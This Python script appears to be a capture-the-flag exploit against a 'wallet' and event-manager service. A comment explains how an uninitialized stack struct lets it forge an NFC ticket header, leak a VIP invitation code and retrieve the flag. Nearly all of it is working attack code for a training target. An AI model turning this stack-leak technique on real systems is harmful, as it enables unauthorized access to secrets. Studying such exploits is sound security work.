#!/usr/bin/env python3

import sys

from util import *


WALLET_PORT = 1337
MANAGER_PORT = 1338


def exploit(ip, flag_id):
    event_id = bytes.fromhex(flag_id)

    # The ticket->user in the stack frame of buy_vip_ticket() will be set to the
    # name we provide. If we then pass a non-existing ticket ID to read_page()
    # the ticket will be left uninitialized and filled with whatever was on the
    # stack.
    #
    # The old struct event in the stack frame of buy_vip_ticket() collides with
    # the struct ticket in read_page() therefore we can leak
    # event->vip_invitation_code. However we first need to pass the call to
    # nfc_verify_tag() that checks the ticket's header.
    #
    # The first 8 bytes of the ticket header in the frame of read_ticket()
    # collide with the last 8 bytes of ticket->user in buy_vip_ticket(), which
    # is controlled. Therefore, we need to craft a valid ticket header and use
    # it as user to try and buy a VIP ticket (doesn't matter that we will not be
    # able to buy it).
    #
    # We cannot control the 2nd check byte in the header since it's at offset 9,
    # *however* in read_page() its value collides with the LSB of the the
    # event->name that was previously in the stack frame of buy_vip_ticket().
    #
    # Being event->name a char * pointer coming from malloc(), it will point to
    # a 16-byte aligned chunk and its lowest nibble will be 0, so we would
    # technically only need to guess the second lowest nibble (4 bits), but
    # things are even simpler. Since the wallet binary does very few allocations
    # the heap page offset of the chunk allocated for event->name will always be
    # the same and therefore the pointer will always end with 0xa0.

    with Wallet(ip, WALLET_PORT) as wallet:
        user = b'X' * 0x14 + bytearray([
            0x73,        # manufacturer
            0x20, 0x41,  # serial[0:1 + 1]
            0x8b,        # 1st check byte (0x73 ^ 0x20 ^ 0x41 ^ 0x99)
            0xa0, 0x00,  # serial[2:4 + 1]
            0x00, 0x00,  # serial[4:6 + 1]
            # 2nd check byte should be 0xa0
        ])
        assert len(user) == 28

        wallet.buy_vip(event_id, user, b'A' * 16, no_verify=True)

        vip_code = b''
        for i in range(10, 14):
            vip_code += wallet.read_page(b'A' * 6, i)

        print('Leaked VIP code:', vip_code.hex())

        ticket_id = wallet.buy_vip(event_id, b'X', vip_code)

    with EventManager(ip, MANAGER_PORT) as evtman:
        evtman.join_event(event_id, wallet.wallet_id, ticket_id, as_vip=True)
        evtman.sit(7, as_vip=True)
        flag = evtman.ask_star_autograph(as_vip=True)

    return flag.decode()


if __name__ == '__main__':
    ip = sys.argv[1]
    flag_id = sys.argv[2]
    print(exploit(ip, flag_id))
